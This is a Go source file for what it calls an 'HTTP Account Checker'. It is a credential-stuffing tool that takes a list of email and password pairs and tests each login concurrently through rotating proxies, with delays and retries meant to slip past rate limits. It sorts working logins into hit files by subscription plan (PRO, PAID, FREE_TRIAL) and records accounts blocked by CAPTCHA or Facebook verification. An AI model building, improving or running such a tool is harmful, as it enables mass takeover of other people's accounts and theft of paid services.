package main

import (
	"fmt"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

type RunOptions struct {
	ConfigPath   string
	AccountsPath string
	ResultsDir   string
	Workers      int
	ProxyPath    string
}

func runChecker(opts RunOptions) (RunStats, time.Duration, error) {
	cfg, err := LoadConfig(opts.ConfigPath)
	if err != nil {
		return RunStats{}, 0, fmt.Errorf("config: %w", err)
	}

	w := cfg.Settings.Workers
	if opts.Workers > 0 {
		w = opts.Workers
	}
	if w <= 0 {
		w = 5
	}

	accounts, err := ParseAccountsFile(opts.AccountsPath)
	if err != nil {
		return RunStats{}, 0, fmt.Errorf("accounts: %w", err)
	}

	checker, err := NewChecker(cfg)
	if err != nil {
		return RunStats{}, 0, fmt.Errorf("checker init: %w", err)
	}

	var proxyPool *ProxyPool
	if opts.ProxyPath != "" {
		proxyPool, err = LoadProxyPool(opts.ProxyPath)
		if err != nil {
			return RunStats{}, 0, fmt.Errorf("proxy: %w", err)
		}
	}

	baseDir := exeDir()
	resultsDir := opts.ResultsDir
	if resultsDir == "" {
		resultsDir = newRunResultsDir(baseDir, cfg)
	}
	if err := os.MkdirAll(resultsDir, 0o755); err != nil {
		return RunStats{}, 0, fmt.Errorf("output dir: %w", err)
	}

	fmt.Println("============================================================")
	fmt.Printf("  HTTP Account Checker — %s\n", cfg.Name)
	fmt.Printf("  Config   : %s\n", opts.ConfigPath)
	fmt.Printf("  Accounts : %s (%d lines)\n", opts.AccountsPath, len(accounts))
	fmt.Printf("  Workers  : %d  |  Delay: %dms  |  Retry: %d\n", w, cfg.Settings.DelayMS, cfg.Settings.RetryOnError)
	if proxyPool != nil {
		fmt.Printf("  Proxy    : %s (%d entries, rotating)\n", opts.ProxyPath, proxyPool.Len())
	} else {
		fmt.Println("  Proxy    : off (direct connection)")
	}
	fmt.Printf("  Output   : %s\n", resultsDir)
	fmt.Println("============================================================")
	fmt.Println()

	jobs := make(chan Account, w*2)
	var wg sync.WaitGroup
	var hitCount, failCount, errCount, rateCount, verifyCount, inactiveCount, captchaCount atomic.Int64
	var fileMu sync.Mutex
	start := time.Now()
	delay := time.Duration(cfg.Settings.DelayMS) * time.Millisecond
	var proxySem chan struct{}
	if proxyPool != nil {
		// Avoid hammering a single rotating proxy gateway with 40+ simultaneous logins.
		maxInflight := proxyPool.MaxInflight()
		proxySem = make(chan struct{}, maxInflight)
		if delay <= 0 {
			delay = 150 * time.Millisecond
		}
		fmt.Printf("  Proxy cap : max %d concurrent logins\n", maxInflight)
	}

	for i := 0; i < w; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for acc := range jobs {
				if delay > 0 {
					time.Sleep(delay)
				}
				if proxySem != nil {
					proxySem <- struct{}{}
				}
				res := checkAccountWithRetry(checker, acc, proxyPool, cfg)
				if proxySem != nil {
					<-proxySem
				}
				switch res.Status {
				case StatusHit:
					hitCount.Add(1)
					fmt.Println(res.ConsoleLine(cfg, true))
					fileMu.Lock()
					_ = writeResultFiles(cfg, res, resultsDir)
					fileMu.Unlock()
				case StatusFail:
					failCount.Add(1)
					fmt.Println(res.ConsoleLine(cfg, false))
					fileMu.Lock()
					_ = writeResultFiles(cfg, res, resultsDir)
					fileMu.Unlock()
				case StatusRateLimited:
					rateCount.Add(1)
					fmt.Printf("[RATE] %s | %s\n", acc.Email, res.Reason)
					fileMu.Lock()
					_ = writeResultFiles(cfg, res, resultsDir)
					fileMu.Unlock()
				case StatusVerifyRequired:
					verifyCount.Add(1)
					fmt.Printf("[SKIP] %s | Facebook verification required", acc.Email)
					if res.PlanName != "" {
						fmt.Printf(" (Plan=%s)", res.PlanName)
					}
					fmt.Println()
					fileMu.Lock()
					_ = writeResultFiles(cfg, res, resultsDir)
					fileMu.Unlock()
				case StatusPlanInactive:
					inactiveCount.Add(1)
					fmt.Printf("[SKIP] %s | %s", acc.Email, res.Reason)
					if res.PlanName != "" {
						fmt.Printf(" (Plan=%s)", res.PlanName)
					}
					fmt.Println()
					fileMu.Lock()
					_ = writeResultFiles(cfg, res, resultsDir)
					fileMu.Unlock()
				case StatusRecaptchaRequired:
					captchaCount.Add(1)
					fmt.Printf("[CAPTCHA] %s | %s\n", acc.Email, res.Reason)
					fileMu.Lock()
					_ = writeResultFiles(cfg, res, resultsDir)
					fileMu.Unlock()
				default:
					errCount.Add(1)
					fmt.Printf("[ERROR] %s | %s\n", acc.Email, res.Reason)
					fileMu.Lock()
					_ = writeResultFiles(cfg, res, resultsDir)
					fileMu.Unlock()
				}
			}
		}()
	}

	for _, acc := range accounts {
		jobs <- acc
	}
	close(jobs)
	wg.Wait()

	elapsed := time.Since(start).Round(time.Millisecond)
	stats := RunStats{
		Total:       len(accounts),
		Hits:        hitCount.Load(),
		Fails:       failCount.Load(),
		RateLimited: rateCount.Load(),
		VerifySkip:  verifyCount.Load(),
		InactiveSkip: inactiveCount.Load(),
		CaptchaSkip:  captchaCount.Load(),
		Errors:      errCount.Load(),
	}

	_ = writeRunSummary(filepath.Join(resultsDir, "summary.txt"), cfg, opts, stats, elapsed)

	fmt.Println("------------------------------------------------------------")
	fmt.Printf("Done in %s | HIT=%d FAIL=%d FB=%d INACTIVE=%d CAPTCHA=%d RATE=%d ERROR=%d\n",
		elapsed, stats.Hits, stats.Fails, stats.VerifySkip, stats.InactiveSkip, stats.CaptchaSkip, stats.RateLimited, stats.Errors)
	fmt.Printf("Results folder:\n  %s\n", filepath.Clean(resultsDir))
	fmt.Println("  summary.txt      — full run stats")
	fmt.Println("  hits.txt           — valid logins + active plan")
	fmt.Println("  by_plan/           — PRO, FREE_TRIAL, PAID...")
	fmt.Println("  paid.txt / free_trial.txt")
	fmt.Println("  facebook_verify.txt — login ok but Facebook verify wall")
	fmt.Println("  inactive_plan.txt   — paid label but no billing / legacy pricing")
	fmt.Println("  invalid.txt        — wrong password")
	fmt.Println("  rate_limited.txt   — HTTP 429 (retry with 3 workers)")
	fmt.Println("  errors.txt         — other errors")

	return stats, elapsed, nil
}

func checkAccountWithRetry(checker *Checker, acc Account, proxyPool *ProxyPool, cfg *Config) CheckResult {
	maxAttempts := 1
	if proxyPool != nil && cfg.Settings.RetryOnError > 0 {
		maxAttempts = cfg.Settings.RetryOnError + 1
	}
	var res CheckResult
	for attempt := 0; attempt < maxAttempts; attempt++ {
		var proxy *url.URL
		if proxyPool != nil {
			proxy = proxyPool.Next()
		}
		res = checker.Check(acc.Email, acc.Password, proxy)
		if !isRetryableCheckResult(res) || attempt+1 >= maxAttempts {
			break
		}
		time.Sleep(time.Duration(400*(attempt+1)) * time.Millisecond)
	}
	return res
}

func isRetryableCheckResult(res CheckResult) bool {
	if res.Status == StatusRateLimited {
		return true
	}
	if res.Status == StatusError {
		lower := strings.ToLower(res.Reason)
		return strings.Contains(lower, "timeout") || strings.Contains(lower, "gateway timeout")
	}
	return false
}
